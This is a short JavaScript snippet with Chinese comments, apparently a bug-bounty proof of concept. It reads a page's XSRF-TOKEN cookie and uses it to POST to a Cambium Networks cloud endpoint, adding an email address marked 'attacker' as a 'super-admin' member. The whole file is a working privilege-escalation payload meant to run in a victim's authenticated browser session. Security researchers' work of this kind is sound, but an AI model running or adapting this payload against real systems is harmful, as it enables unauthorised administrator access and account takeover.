function getCookie(name) {
    // 使用正则表达式查找名为name的cookie值
    let cookieArr = document.cookie.split('; ');
    for (let i = 0; i < cookieArr.length; i++) {
        let cookiePair = cookieArr[i].split('=');
        // 解码cookie名称并检查是否匹配
        if (decodeURIComponent(cookiePair[0]) === name) {
            // 如果找到匹配项，返回解码后的cookie值
            return decodeURIComponent(cookiePair[1]);
        }
    }
    // 如果没有找到指定名称的cookie，则返回null
    return null;
}

// 使用示例：获取XSRF-TOKEN的值
let xsrfToken = getCookie('XSRF-TOKEN');
if (xsrfToken) {
    console.log('XSRF-TOKEN:', xsrfToken);
  // 获取XSRF-Token的值，这里假设你已经通过某种方式获取了这个值    
    fetch('https://qa-us-east-1-srv-2.cloud.cambiumnetworks.com/WOOYUNTEST/cn-srv/members', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Xsrf-Token': xsrfToken, // 设置X-Xsrf-Token头部
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Priority': 'u=1, i'
        },
        body: JSON.stringify({
            "emails": ["esperamier+attacker@intigriti.me"],
            "role": "super-admin",
            "admin": false,
            "whitelistCheck": true
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json(); // 或者使用 response.text() 如果期望返回非JSON格式的数据
    })
    .then(data => console.log(data))
    .catch(error => console.error('There was a problem with the fetch operation:', error));

  
} else {
    console.log('XSRF-TOKEN not found.');
}
